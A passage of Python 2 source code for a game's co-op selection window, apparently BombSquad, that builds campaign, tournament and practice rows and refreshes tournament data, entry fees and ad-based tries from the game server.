        bsInternal._setAnalyticsScreen('Coop Window')

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        # try to recreate the same number of buttons we had last time so our
        # re-selection code works
        try:
            self._tournamentButtonCount = bs.getConfig()['Tournament Rows']
        except Exception:
            self._tournamentButtonCount = 0

        #self._enableChallenges = True
        self._enableChallenges = False

        # same for challenges..
        try:
            self._challengeButtonCount = bs.getConfig()[
                'Challenge Button Count']
        except Exception:
            self._challengeButtonCount = 0

        self._width = 1320 if gSmallUI else 1120
        self._xInset = xInset = 100 if gSmallUI else 0
        self._height = 657 if gSmallUI else 730 if gMedUI else 800
        global gMainWindow
        gMainWindow = "Coop Select"
        self._r = 'coopSelectWindow'
        topExtra = 20 if gSmallUI else 0

        self._tourneyDataUpToDate = False

        self._campaignDifficulty = bsInternal._getAccountMiscVal(
            'campaignDifficulty',
            'easy')

        bs.gCreateGameType = None
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + topExtra),
            toolbarVisibility='MENU_FULL', scaleOriginStackOffset=scaleOrigin,
            stackOffset=(0, -15) if gSmallUI else(0, 0) if gMedUI else(0, 0),
            transition=transition, scale=1.2
            if gSmallUI else 0.8 if gMedUI else 0.75)

        if gToolbars and gSmallUI:
            self._backButton = None
        else:
            self._backButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(75 + xInset, self._height - 87 -
                          (4 if gSmallUI else 0)),
                size=(120, 60),
                scale=1.2, autoSelect=True, label=bs.Lstr(
                    resource='backText'),
                buttonType='back')

        if not gToolbars:
            prb = self._powerRankingButtonInstance = PowerRankingButton(
                parent=self._rootWidget,
                position=(self._width - (282 + xInset),
                          self._height - 85 - (4 if gSmallUI else 0)),
                size=(100, 60),
                color=(0.4, 0.4, 0.9),
                textColor=(0.9, 0.9, 2.0),
                scale=1.05, onActivateCall=bs.WeakCall(
                    self._switchToPowerRankings))
            self._powerRankingButton = prb.getButtonWidget()

            sb = self._storeButtonInstance = StoreButton(
                parent=self._rootWidget,
                position=(self._width - (170 + xInset),
                          self._height - 85 - (4 if gSmallUI else 0)),
                size=(100, 60),
                color=(0.6, 0.4, 0.7),
                showTickets=True, buttonType='square', saleScale=0.85,
                textColor=(0.9, 0.7, 1.0),
                scale=1.05, onActivateCall=bs.WeakCall(
                    self._switchToStore, showTab=None))
            self._storeButton = sb.getButtonWidget()
            bs.widget(edit=self._backButton,
                      rightWidget=self._powerRankingButton)
            bs.widget(edit=self._powerRankingButton,
                      leftWidget=self._backButton)
        else:
            self._powerRankingButtonInstance = self._storeButtonInstance = \
                self._storeButton = self._powerRankingButton = None

        # move our corner buttons dynamically to keep them out of the way of
        # the party icon :-(
        self._updateCornerButtonPositions()
        self._updateCornerButtonPositionsTimer = bs.Timer(1000, bs.WeakCall(
            self._updateCornerButtonPositions), repeat=True, timeType='real')

        self._lastTournamentQueryTime = None
        self._lastTournamentQueryResponseTime = None
        self._doingTournamentQuery = False

        bsConfig = bs.getConfig()

        try:
            self._selectedCampaignLevel = \
                bsConfig['Selected Coop Campaign Level']
        except Exception:
            self._selectedCampaignLevel = None

        try:
            self._selectedCustomLevel = bsConfig['Selected Coop Custom Level']
        except Exception:
            self._selectedCustomLevel = None

        try:
            self._selectedChallengeLevel = \
                bsConfig['Selected Coop Challenge Level']
        except Exception:
            self._selectedChallengeLevel = None

        # dont want initial construction affecting our last-selected
        self._doSelectionCallbacks = False
        v = self._height - 95
        t = campaignText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, v + 40 - (0 if gSmallUI else 0)),
            size=(0, 0),
            text=bs.Lstr(
                resource='playModes.singlePlayerCoopText',
                fallbackResource='playModes.coopText'),
            hAlign="center", color=gTitleColor, scale=1.5, maxWidth=500,
            vAlign="center")
        campaignTextV = v

        if gToolbars and gSmallUI:
            bs.textWidget(edit=t, text='')

        if gDoAndroidNav:
            if self._backButton is not None:
                bs.buttonWidget(
                    edit=self._backButton, buttonType='backSmall',
                    size=(60, 50),
                    position=(75+xInset,
                              self._height-87-(4 if gSmallUI else 0)+6),
                    label=bs.getSpecialChar('back'))

        try:
            self._selectedRow = bsConfig['Selected Coop Row']
        except Exception:
            self._selectedRow = None

        self._starTex = bs.getTexture('star')
        self._lsbt = bs.getModel('levelSelectButtonTransparent')
        self._lsbo = bs.getModel('levelSelectButtonOpaque')
        self._aOutlineTex = bs.getTexture('achievementOutline')
        self._aOutlineModel = bs.getModel('achievementOutline')

        self._scrollWidth = self._width-(130+2*xInset)
        self._scrollHeight = self._height - (190
                                             if gSmallUI and gToolbars else 160)

        self._subContainerWidth = 800
        self._subContainerHeight = 1400

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, highlight=False,
            position=(65 + xInset, 120)
            if gSmallUI and gToolbars else(65 + xInset, 70),
            size=(self._scrollWidth, self._scrollHeight),
            simpleCullingV=10.0)
        self._subContainer = None

        # take note of our account state; we'll refresh later if this changes
        self._accountStateNum = bsInternal._getAccountStateNum()
        # same for fg/bg state..
        self._fgState = bsUtils.gAppFGState

        self._refresh()
        self._restore_state()

        # even though we might display cached tournament data immediately, we
        # don't consider it valid until we've pinged
        # the server for an update
        self._tourneyDataUpToDate = False

        # if we've got a cached tournament list for our account and info for
        # each one of those tournaments,
        # go ahead and display it as a starting point...
        if (gAccountTournamentList is not None
            and gAccountTournamentList[0] == bsInternal._getAccountStateNum()
            and gAccountChallengeList is not None
            and gAccountChallengeList['accountState'] == \
            bsInternal._getAccountStateNum()
            and all([tID in gTournamentInfo
                     for tID in gAccountTournamentList[1]])):
            tourneyData = [gTournamentInfo[tID]
                           for tID in gAccountTournamentList[1]]
            self._updateForData(
                tourneyData, gAccountChallengeList['challenges'])

        # this will pull new data periodically, update timers, etc..
        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            timeType='real', repeat=True)
        self._update()

    def _update(self):

        curTime = bs.getRealTime()

        # if its been a while since we got a tournament update, consider the
        # data invalid (prevents us from joining tournaments if our internet
        # connection goes down for a while)
        if (self._lastTournamentQueryResponseTime is None or bs.getRealTime()
                - self._lastTournamentQueryResponseTime > 1000*60*2):
            self._tourneyDataUpToDate = False

        # if our account state has changed, do a full request
        accountStateNum = bsInternal._getAccountStateNum()
        if accountStateNum != self._accountStateNum:
            self._accountStateNum = accountStateNum
            self._save_state()
            self._refresh()
            # also encourage a new tournament query since this will clear out
            # our current results..
            if not self._doingTournamentQuery:
                self._lastTournamentQueryTime = None

        # if we've been backgrounded/foregrounded, invalidate our
        # tournament entries (they will be refreshed below asap)
        if self._fgState != bsUtils.gAppFGState:
            self._tourneyDataUpToDate = False

        # send off a new tournament query if its been long enough or whatnot..
        if not self._doingTournamentQuery and (
                self._lastTournamentQueryTime is None
                or curTime-self._lastTournamentQueryTime > 30000
                or self._fgState != bsUtils.gAppFGState):
            self._fgState = bsUtils.gAppFGState
            self._lastTournamentQueryTime = curTime
            self._doingTournamentQuery = True
            bsInternal._tournamentQuery(
                args={'source': 'coop window refresh', 'numScores': 1},
                callback=bs.WeakCall(self._onTournamentQueryResponse))

        # decrement time on our tournament buttons..
        adsEnabled = bsInternal._haveIncentivizedAd()
        for tb in self._tournamentButtons:
            tb['timeRemaining'] = max(0, tb['timeRemaining']-1)
            if tb['timeRemainingValueText'] is not None:
                bs.textWidget(
                    edit=tb['timeRemainingValueText'],
                    text=bsUtils.getTimeString(
                        tb['timeRemaining'] * 1000, centi=False)
                    if(tb['hasTimeRemaining'] and self._tourneyDataUpToDate) else
                    '-')
            # also adjust the ad icon visibility
            if tb.get('allowAds', False) and bsInternal._hasVideoAds():
                bs.imageWidget(
                    edit=tb['entryFeeAdImage'],
                    opacity=1.0 if adsEnabled else 0.25)
                bs.textWidget(edit=tb['entryFeeTextRemaining'], color=(
                    0.6, 0.6, 0.6, 1 if adsEnabled else 0.2))

        self._updateHardModeLockImage()

    def _updateHardModeLockImage(self):
        try:
            haveProOptions = bsUtils._haveProOptions()
            bs.imageWidget(
                edit=self._hardButtonLockImage, opacity=0.0
                if haveProOptions else 1.0)
        except Exception as e:
            bs.printException('error updating campaign lock')

    def _updateForData(self, data, challengeData):

        # if the number of tournaments or challenges in the data differs from
        # our current arrangement, refresh with the new number
        if (((data is None and (self._tournamentButtonCount != 0
                                or self._challengeButtonCount != 0))
             or (data is not None
                 and ((len(data) != self._tournamentButtonCount)
                      or len(challengeData) != self._challengeButtonCount)))):
            self._tournamentButtonCount = len(data) if data is not None else 0
            self._challengeButtonCount = len(
                challengeData) if challengeData is not None else 0
            bs.getConfig()['Tournament Rows'] = self._tournamentButtonCount
            bs.getConfig()[
                'Challenge Button Count'] = self._challengeButtonCount
            self._refresh()

        # push new data to our challenge buttons
        if self._enableChallenges:
            for i, cb in enumerate(self._challengeButtons):
                try:
                    cb.updateForData(
                        None if challengeData is None else challengeData[i])
                except Exception as e:
                    print 'EXC updating challenge button', e

        # update all of our tourney buttons based on whats in data..
        for i, tb in enumerate(self._tournamentButtons):

            try:
                entry = data[i]
            except Exception:
                entry = None
            prizeYOffs = (0 if entry is None
                          else 34 if 'prizeRange3' in entry
                          else 20 if 'prizeRange2' in entry
                          else 12)
            xOffs = 90

            pr1, pv1, pr2, pv2, pr3, pv3 = _getPrizeStrings(entry)
            enabled = False if 'requiredLeague' in entry else True
            bs.buttonWidget(edit=tb['button'], color=(
                0.5, 0.7, 0.2) if enabled else (0.5, 0.5, 0.5))
            bs.imageWidget(
                edit=tb['lockImage'],
                opacity=0.0 if enabled else 1.0)
            bs.textWidget(
                edit=tb['prizeRange1Text'],
                text='-' if pr1 == '' else pr1,
                position=(tb['buttonX'] + 365 + xOffs, tb['buttonY'] +
                          tb['buttonScaleY'] - 93 + prizeYOffs))

            # we want to draw values containing tickets a bit smaller
            # (scratch that; we now draw medals a bit bigger)
            ticketChar = bs.getSpecialChar('ticketBacking')
            prizeValueScaleLarge = 1.0
            prizeValueScaleSmall = 1.0

            bs.textWidget(
                edit=tb['prizeValue1Text'],
                text='-' if pv1 == '' else pv1, scale=prizeValueScaleLarge
                if ticketChar not in pv1 else prizeValueScaleSmall,
                position=(tb['buttonX'] + 380 + xOffs, tb['buttonY'] +
                          tb['buttonScaleY'] - 93 + prizeYOffs))

            bs.textWidget(edit=tb['prizeRange2Text'],
                          text=pr2,
                          position=(tb['buttonX']+365+xOffs,
                                    tb['buttonY']+tb['buttonScaleY']
                                    -93-45+prizeYOffs))
            bs.textWidget(
                edit=tb['prizeValue2Text'],
                text=pv2, scale=prizeValueScaleLarge
                if ticketChar not in pv2 else prizeValueScaleSmall,
                position=(tb['buttonX'] + 380 + xOffs, tb['buttonY'] +
                          tb['buttonScaleY'] - 93 - 45 + prizeYOffs))

            bs.textWidget(edit=tb['prizeRange3Text'],
                          text=pr3,
                          position=(tb['buttonX']+365+xOffs,
                                    tb['buttonY']+tb['buttonScaleY']
                                    -93-90+prizeYOffs))
            bs.textWidget(
                edit=tb['prizeValue3Text'],
                text=pv3, scale=prizeValueScaleLarge
                if ticketChar not in pv3 else prizeValueScaleSmall,
                position=(tb['buttonX'] + 380 + xOffs, tb['buttonY'] +
                          tb['buttonScaleY'] - 93 - 90 + prizeYOffs))

            leaderName = '-'
            leaderScore = '-'
            if entry is not None and entry['scores']:
                score = tb['leader'] = copy.deepcopy(entry['scores'][0])
                leaderName = score[1]
                leaderScore = (bsUtils.getTimeString(score[0]*10, centi=True)
                               if entry['scoreType'] == 'time'
                               else str(score[0]))
            else:
                tb['leader'] = None

            bs.textWidget(
                edit=tb['currentLeaderNameText'],
                text=bs.Lstr(value=leaderName))
            self._tournamentLeaderScoreType = (None if entry is None
                                               else entry['scoreType'])
            bs.textWidget(edit=tb['currentLeaderScoreText'], text=leaderScore)
            bs.buttonWidget(
                edit=tb['moreScoresButton'],
                label='-'
                if entry is None else bs.Lstr(
                    resource=self._r + '.seeMoreText'))
            outOfTimeText = (
                '-' if entry is None or 'totalTime' not in entry else bs.Lstr(
                    resource=self._r+'.ofTotalTimeText',
                    subs=[('${TOTAL}',
                           bsUtils.getTimeString(entry['totalTime']*1000,
                                                 centi=False))]))
            bs.textWidget(edit=tb['timeRemainingOutOfText'], text=outOfTimeText)

            tb['timeRemaining'] = 0 if entry is None else entry['timeRemaining']
            tb['hasTimeRemaining'] = False if entry is None else True
            tb['tournamentID'] = (None if entry is None
                                  else entry['tournamentID'])
            tb['requiredLeague'] = (None if 'requiredLeague' not in entry
                                    else entry['requiredLeague'])

            game = (None if entry is None
                    else gTournamentInfo[tb['tournamentID']]['game'])

            if game is None:
                bs.textWidget(edit=tb['buttonText'], text='-')
                bs.imageWidget(
                    edit=tb['image'],
                    texture=bs.getTexture('black'),
                    opacity=0.2)
            else:
                campaignName, levelName = game.split(':')
                campaign = bsCoopGame.getCampaign(campaignName)
                maxPlayers = gTournamentInfo[tb['tournamentID']]['maxPlayers']
                t = bs.Lstr(value='${A} ${B}',subs=[(
                    '${A}', campaign.getLevel(levelName).getDisplayString(
                    )), ('${B}', bs.Lstr(resource='playerCountAbbreviatedText',
                                         subs=[('${COUNT}',
                                                str(maxPlayers))]))])
                bs.textWidget(edit=tb['buttonText'], text=t)
                bs.imageWidget(edit=tb['image'], texture=campaign.getLevel(
                    levelName).getPreviewTex(), opacity=1.0 if enabled else 0.5)

            fee = None if entry is None else entry['fee']

            if fee is None:
                feeVar = None
            elif fee == 4:
                feeVar = 'price.tournament_entry_4'
            elif fee == 3:
                feeVar = 'price.tournament_entry_3'
            elif fee == 2:
                feeVar = 'price.tournament_entry_2'
            elif fee == 1:
                feeVar = 'price.tournament_entry_1'
            else:
                if fee != 0:
                    print 'Unknown fee value:', fee
                feeVar = 'price.tournament_entry_0'

            tb['allowAds'] = allowAds = entry['allowAds']

            finalFee = (None if feeVar is None
                        else bsInternal._getAccountMiscReadVal(feeVar, '?'))

            finalFeeStr = '' if feeVar is None else bs.Lstr(
                resource='getTicketsWindow.freeText') if finalFee == 0 else(
                bs.getSpecialChar('ticketBacking') + str(finalFee))

            adTriesRemaining = gTournamentInfo[tb['tournamentID']][
                'adTriesRemaining']
            freeTriesRemaining = gTournamentInfo[tb['tournamentID']][
                'freeTriesRemaining']

            # now, if this fee allows ads and we support video ads, show
            # the 'or ad' version
            if allowAds and bsInternal._hasVideoAds():
                adsEnabled = bsInternal._haveIncentivizedAd()
                bs.imageWidget(
                    edit=tb['entryFeeAdImage'],
                    opacity=1.0 if adsEnabled else 0.25)
                orText = bs.Lstr(resource='orText', subs=[
                                 ('${A}', ''), ('${B}', '')]).evaluate().strip()
                bs.textWidget(edit=tb['entryFeeTextOr'], text=orText)
                bs.textWidget(
                    edit=tb['entryFeeTextTop'],
                    position=(tb['buttonX'] + 360, tb['buttonY'] +
                              tb['buttonScaleY'] - 60),
                    scale=1.3, text=finalFeeStr)
                # possibly show number of ad-plays remaining
                bs.textWidget(
                    edit=tb['entryFeeTextRemaining'],
                    position=(tb['buttonX'] + 360, tb['buttonY'] +
                              tb['buttonScaleY'] - 146),
                    text=''
                    if adTriesRemaining
                    in [None, 0] else('' + str(adTriesRemaining)),
                    color=(0.6, 0.6, 0.6, 1 if adsEnabled else 0.2))
            else:
                bs.imageWidget(edit=tb['entryFeeAdImage'], opacity=0.0)
                bs.textWidget(edit=tb['entryFeeTextOr'], text='')
                bs.textWidget(
                    edit=tb['entryFeeTextTop'],
                    position=(tb['buttonX'] + 360, tb['buttonY'] +
                              tb['buttonScaleY'] - 80),
                    scale=1.3, text=finalFeeStr)
                # possibly show number of free-plays remaining
                bs.textWidget(
                    edit=tb['entryFeeTextRemaining'],
                    position=(tb['buttonX'] + 360, tb['buttonY'] +
                              tb['buttonScaleY'] - 100),
                    text=''
                    if(freeTriesRemaining in [None, 0] or finalFee != 0)
                    else('' + str(freeTriesRemaining)), color=(0.6, 0.6, 0.6, 1))

    def _onTournamentQueryResponse(self, data):

        if data is not None:
            challengeData = data['c']
            tournamentData = data['t']  # this used to be the whole payload
            self._lastTournamentQueryResponseTime = bs.getRealTime()
        else:
            challengeData = tournamentData = None

        # keep our cached tourney info up to date
        if data is not None:
            self._tourneyDataUpToDate = True
            _cacheTournamentInfo(tournamentData)
            # also cache the current tourney list/order for this account
            global gAccountTournamentList
            gAccountTournamentList = (
                bsInternal._getAccountStateNum(),
                [e['tournamentID'] for e in tournamentData])
            # and cache the current challenge list for this account
            global gAccountChallengeList
            # challenge times are provided relative to now; convert them
            # to absolute times so they stay correct as time marches on
            challengeData = copy.deepcopy(challengeData)
            t = time.time()
            for c in challengeData:
                for key in ['waitStart', 'waitEnd', 'start', 'end']:
                    c[key] += t
            gAccountChallengeList = {
                'accountState': bsInternal._getAccountStateNum(),
                'challenges': challengeData}

        self._doingTournamentQuery = False

        self._updateForData(tournamentData, challengeData)

    def _setCampaignDifficulty(self, difficulty):
        if difficulty != self._campaignDifficulty:
            if difficulty == 'hard' and not bsUtils._haveProOptions():
                PurchaseWindow(items=['pro'])
                return
            bs.playSound(bs.getSound('gunCocking'))
            if difficulty not in ('easy', 'hard'):
                print 'ERROR: invalid campaign difficulty:', difficulty
                difficulty = 'easy'
            self._campaignDifficulty = difficulty

            bsInternal._addTransaction(
                {'type': 'SET_MISC_VAL', 'name': 'campaignDifficulty',
                 'value': difficulty})
            self._refreshCampaignRow()
        else:
            bs.playSound(bs.getSound('click01'))

    def _refreshCampaignRow(self):

        parentWidget = self._campaignSubContainer

        # clear out anything in the parent widget already..
        for c in parentWidget.getChildren():
            c.delete()

        if self._enableChallenges:
            nextWidgetDown = self._challengesInfoButton
        else:
            nextWidgetDown = self._tournamentInfoButton

        h = 0
        hBase = 6
        v2 = -2
        selColor = (0.75, 0.85, 0.5)
        selColorHard = (0.4, 0.7, 0.2)
        unSelColor = (0.5, 0.5, 0.5)
        selTextColor = (2, 2, 0.8)
        unSelTextColor = (0.6, 0.6, 0.6)
        self._easyButton = bs.buttonWidget(
            parent=parentWidget, position=(h + 30, v2 + 105),
            size=(120, 70),
            label=bs.Lstr(resource='difficultyEasyText'),
            buttonType='square', autoSelect=True, enableSound=False,
            onActivateCall=bs.Call(self._setCampaignDifficulty, 'easy'),
            onSelectCall=bs.Call(self._selChange, 'campaign', 'easyButton'),
            color=selColor
            if self._campaignDifficulty == 'easy' else unSelColor,
            textColor=selTextColor
            if self._campaignDifficulty == 'easy' else unSelTextColor)
        bs.widget(edit=self._easyButton, showBufferLeft=100)
        if self._selectedCampaignLevel == 'easyButton':
            bs.containerWidget(
                edit=parentWidget, selectedChild=self._easyButton,
                visibleChild=self._easyButton)

        lockTex = bs.getTexture('lock')

        self._hardButton = bs.buttonWidget(
            parent=parentWidget, position=(h + 30, v2 + 32),
            size=(120, 70),
            label=bs.Lstr(resource='difficultyHardText'),
            buttonType='square', autoSelect=True, enableSound=False,
            onActivateCall=bs.Call(self._setCampaignDifficulty, 'hard'),
            onSelectCall=bs.Call(self._selChange, 'campaign', 'hardButton'),
            color=selColorHard
            if self._campaignDifficulty == 'hard' else unSelColor,
            textColor=selTextColor
            if self._campaignDifficulty == 'hard' else unSelTextColor)
        self._hardButtonLockImage = bs.imageWidget(
            parent=parentWidget, size=(30, 30),
            drawController=self._hardButton,
            position=(h + 30 - 10, v2 + 32 + 70 - 35),
            texture=lockTex)
        self._updateHardModeLockImage()
        bs.widget(edit=self._hardButton, showBufferLeft=100)
        if self._selectedCampaignLevel == 'hardButton':
            bs.containerWidget(
                edit=parentWidget, selectedChild=self._hardButton,
                visibleChild=self._hardButton)

        bs.widget(edit=self._hardButton, downWidget=nextWidgetDown)

        h = hBase

        hSpacing = 200
        campaignButtons = []

        if self._campaignDifficulty == 'easy':
            campaignName = 'Easy'
        else:
            campaignName = 'Default'

        items = [campaignName+':Onslaught Training',
                 campaignName+':Rookie Onslaught',
                 campaignName+':Rookie Football',
                 campaignName+':Pro Onslaught',
                 campaignName+':Pro Football',
                 campaignName+':Pro Runaround',
                 campaignName+':Uber Onslaught',
                 campaignName+':Uber Football',
                 campaignName+':Uber Runaround']

        items += [campaignName+':The Last Stand']

        if self._selectedCampaignLevel is None:
            self._selectedCampaignLevel = items[0]

        h = 150
        for i in items:
            isLastSel = (i == self._selectedCampaignLevel)
            campaignButtons.append(self._GameButton(
                self, parentWidget, i, h, v2, isLastSel,
                'campaign').getButton())
            h += hSpacing

        bs.widget(edit=campaignButtons[0], leftWidget=self._easyButton)

        if self._backButton is not None:
            bs.widget(edit=self._easyButton, upWidget=self._backButton)
            for b in campaignButtons:
                bs.widget(
                    edit=b, upWidget=self._backButton,
                    downWidget=nextWidgetDown)

        # update our existing perecent-complete text..
        campaign = bsCoopGame.getCampaign(campaignName)
        levels = campaign.getLevels()
        levelsComplete = sum((1 if l.getComplete() else 0) for l in levels)

        # last level cant be completed; hence the -1
        progress = min(1.0, float(levelsComplete)/(len(levels)-1))
        pStr = str(int(progress*100.0))+'%'

        self._campaignPercentText = bs.textWidget(
            edit=self._campaignPercentText, text=bs.Lstr(
                value='${C} (${P})',
                subs=[('${C}', bs.Lstr(
                    resource=self._r + '.campaignText')),
                    ('${P}', pStr)]))

    def _onChallengesInfoPress(self):
        txt = bs.Lstr(resource=self._r+'.challengesInfoText')
        ConfirmWindow(
            txt, cancelButton=False, width=550, height=260,
            originWidget=self._challengesInfoButton)

    def _onTournamentInfoPress(self):
        txt = bs.Lstr(resource=self._r+'.tournamentInfoText')
        ConfirmWindow(
            txt, cancelButton=False, width=550, height=260,
            originWidget=self._tournamentInfoButton)

    def _refresh(self):

        # (re)create the sub-container if need be..
        if self._subContainer is not None:
            self._subContainer.delete()

        tourneyRowHeight = 200
        self._subContainerHeight = (
            620+self._tournamentButtonCount*tourneyRowHeight + (250 if (
                self._challengeButtonCount > 0 and self._enableChallenges
            ) else 120 if self._enableChallenges else 0))

        self._subContainer = c = bs.containerWidget(
            parent=self._scrollWidget,
            size=(self._subContainerWidth, self._subContainerHeight),
            background=False)

        # so we can still select root level widgets with controllers
        bs.containerWidget(
            edit=self._scrollWidget, claimsLeftRight=True, claimsTab=True,
            selectionLoopToParent=True)
        bs.containerWidget(
            edit=self._subContainer, claimsLeftRight=True, claimsTab=True,
            selectionLoopToParent=True)
        bs.containerWidget(edit=self._rootWidget,
                           selectedChild=self._scrollWidget)
        if self._backButton is not None:
            bs.containerWidget(edit=self._rootWidget,
                               cancelButton=self._backButton)

        wParent = self._subContainer
        hBase = 6

        v = self._subContainerHeight - 73
        vSpacing = 190

        self._campaignPercentText = bs.textWidget(
            parent=wParent, position=(hBase + 27, v + 30),
            size=(0, 0),
            text='', hAlign="left", vAlign='center', color=gTitleColor,
            scale=1.1)

        rowVShowBuffer = 100
        v -= 198

        h = hBase

        self._campaignHScroll = campaignHScroll = hScroll = bs.hScrollWidget(
            parent=wParent, size=(self._scrollWidth - 10, 205),
            position=(-5, v),
            simpleCullingH=70, highlight=False, borderOpacity=0.0,
            color=(0.45, 0.4, 0.5),
            onSelectCall=bs.Call(self._onRowSelected, 'campaign'))
        bs.widget(edit=hScroll, showBufferTop=rowVShowBuffer,
                  showBufferBottom=rowVShowBuffer, autoSelect=True)
        if self._selectedRow == 'campaign':
            bs.containerWidget(
                edit=wParent, selectedChild=hScroll, visibleChild=hScroll)
        bs.containerWidget(edit=hScroll, claimsLeftRight=True)
        self._campaignSubContainer = bs.containerWidget(
            parent=hScroll, size=(180+200*10, 200), background=False)

        # Challenges
        if self._enableChallenges:
            self._challengeButtons = challengeButtons = []

            v2 = -2
            h = 0
            v -= 50
            txt = bs.Lstr(resource='coopSelectWindow.challengesText')
            tWidth = bsInternal._getStringWidth(txt, suppressWarning=True)
            bs.textWidget(parent=wParent,
                          position=(hBase + 27, v + 30 - 200 + 198),
                          size=(0, 0),
                          text=txt, hAlign="left", vAlign='center',
                          color=gTitleColor, scale=1.1)
            self._challengesInfoButton = bs.buttonWidget(
                parent=wParent, label='?', size=(20, 20),
                textScale=0.6,
                position=(hBase + 27 + tWidth * 1.1 + 15, v + 18),
                buttonType='square', color=(0.6, 0.5, 0.65),
                textColor=(0.7, 0.6, 0.75),
                autoSelect=True, onActivateCall=self._onChallengesInfoPress)

            # say 'unavailable' if there are zero tournaments, and if we're
            # not signed in add that as well (that's probably why we see
            # no tournaments)
            if self._challengeButtonCount == 0:
                unavailableText = bs.Lstr(resource='unavailableText')
                if bsInternal._getAccountState() != 'SIGNED_IN':
                    unavailableText = bs.Lstr(
                        value='${A} (${B})',
                        subs=[('${A}', unavailableText),
                              ('${B}', bs.Lstr(
                                  resource='notSignedInText'))])
                bs.textWidget(
                    parent=wParent, position=(hBase + 47, v),
                    size=(0, 0),
                    text=unavailableText, hAlign="left", vAlign='center',
                    color=gTitleColor, scale=0.9)
                v -= 40

            else:
                v -= 220
                items = ['Challenges:Ninja Fight'] * self._challengeButtonCount
                self._challengeHScroll = challengeHScroll = hScroll = \
                    bs.hScrollWidget(
                        parent=wParent, size=(self._scrollWidth-10, 225),
                        position=(-5, v), highlight=False, borderOpacity=0.0,
                        color=(0.45, 0.4, 0.5),
                        onSelectCall=bs.Call(self._onRowSelected, 'challenges'))
                bs.widget(edit=self._challengesInfoButton,
                          downWidget=self._challengeHScroll,
                          rightWidget=self._challengesInfoButton)
                bs.widget(edit=hScroll, showBufferTop=rowVShowBuffer,
                          showBufferBottom=1.5*rowVShowBuffer, autoSelect=True)
                if self._selectedRow == 'challenges':
                    bs.containerWidget(
                        edit=wParent, selectedChild=hScroll,
                        visibleChild=hScroll)
                bs.containerWidget(edit=hScroll, claimsLeftRight=True)
                hSpacing = 300
                sc2 = bs.containerWidget(
                    parent=hScroll,
                    size=(max(self._scrollWidth-24,
                              30+hSpacing*self._challengeButtonCount), 200),
                    background=False)
                h = 0
                v2 = -4
                for num, i in enumerate(items):
                    isLastSel = (num == self._selectedChallengeLevel)
                    self._challengeButtons.append(self._ChallengeButton(
                        self, sc2, num, h, v2, isLastSel, 'challenges'))
                    h += hSpacing

        # Tournaments

        self._tournamentButtons = []

        v -= 53
        # FIXME shouldn't use hard-coded strings here..
        txt = bs.Lstr(resource='tournamentsText',
                      fallbackResource='tournamentText').evaluate()
        tWidth = bsInternal._getStringWidth(txt, suppressWarning=True)
        bs.textWidget(
            parent=wParent, position=(hBase + 27, v + 30),
            size=(0, 0),
            text=txt, hAlign="left", vAlign='center', color=gTitleColor,
            scale=1.1)
        self._tournamentInfoButton = bs.buttonWidget(
            parent=wParent, label='?', size=(20, 20), textScale=0.6,
            position=(hBase+27+tWidth*1.1+15, v+18), buttonType='square',
            color=(0.6, 0.5, 0.65), textColor=(0.7, 0.6, 0.75), autoSelect=True,
            upWidget=((self._challengeHScroll if self._challengeButtonCount > 0
                       else self._challengesInfoButton)
                      if self._enableChallenges else self._campaignHScroll),
            onActivateCall=self._onTournamentInfoPress)
        bs.widget(edit=self._tournamentInfoButton,
                  leftWidget=self._tournamentInfoButton,
                  rightWidget=self._tournamentInfoButton)

        # say 'unavailable' if there are zero tournaments, and if we're not
        # signed in add that as well (that's probably why we see no tournaments)
        if self._tournamentButtonCount == 0:
            unavailableText = bs.Lstr(resource='unavailableText')
            if bsInternal._getAccountState() != 'SIGNED_IN':
                unavailableText = bs.Lstr(
                    value='${A} (${B})',
                    subs=[('${A}', unavailableText),
                          ('${B}', bs.Lstr(resource='notSignedInText'))])
            bs.textWidget(
                parent=wParent, position=(hBase + 47, v),
                size=(0, 0),
                text=unavailableText, hAlign="left", vAlign='center',
                color=gTitleColor, scale=0.9)
            v -= 40
        v -= 198

        if self._tournamentButtonCount > 0:

            for i in range(self._tournamentButtonCount):
                tournamentHScroll = hScroll = bs.hScrollWidget(
                    parent=wParent, size=(self._scrollWidth - 10, 205),
                    position=(-5, v),
                    highlight=False, borderOpacity=0.0, color=(0.45, 0.4, 0.5),
                    onSelectCall=bs.Call(
                        self._onRowSelected, 'tournament' + str(i + 1)))
                bs.widget(edit=hScroll, showBufferTop=rowVShowBuffer,
                          showBufferBottom=rowVShowBuffer, autoSelect=True)
                if self._selectedRow == 'tournament'+str(i+1):
                    bs.containerWidget(
                        edit=wParent, selectedChild=hScroll,
                        visibleChild=hScroll)
                bs.containerWidget(edit=hScroll, claimsLeftRight=True)
                sc2 = bs.containerWidget(parent=hScroll, size=(
                    self._scrollWidth-24, 200), background=False)
                h = 0
                v2 = -2
                isLastSel = True
                self._tournamentButtons.append(
                    self._tournamentButton(sc2, h, v2, isLastSel))
                v -= 200

        # Custom Games
        v2 = -2
        h = 0
        v -= 50
        bs.textWidget(
            parent=wParent, position=(hBase + 27, v + 30 + 198),
            size=(0, 0),
            text=bs.Lstr(
                resource='practiceText',
                fallbackResource='coopSelectWindow.customText'),
            hAlign="left", vAlign='center', color=gTitleColor, scale=1.1)

        #v -= 198
        items = [
            'Challenges:Infinite Onslaught',
            'Challenges:Infinite Runaround',
            'Challenges:Ninja Fight',
            'Challenges:Pro Ninja Fight',
            'Challenges:Meteor Shower',
            'Challenges:Target Practice B',
            'Challenges:Target Practice',
            #'Challenges:Lake Frigid Race',
            # 'Challenges:Uber Runaround',
            # 'Challenges:Runaround',
            # 'Challenges:Pro Race',
            # 'Challenges:Pro Football',
            #'Challenges:Epic Meteor Shower',
            # 'Challenges:Testing',
            #'User:Ninja Fight',
        ]
        # show easter-egg-hunt either if its easter or we own it
        if bsInternal._getAccountMiscReadVal(
                'easter', False) or bsInternal._getPurchased(
                'games.easter_egg_hunt'):
            items = ['Challenges:Easter Egg Hunt',
                     'Challenges:Pro Easter Egg Hunt'] + items

        # add all custom user levels here..
        items += ['User:' + l.getName()
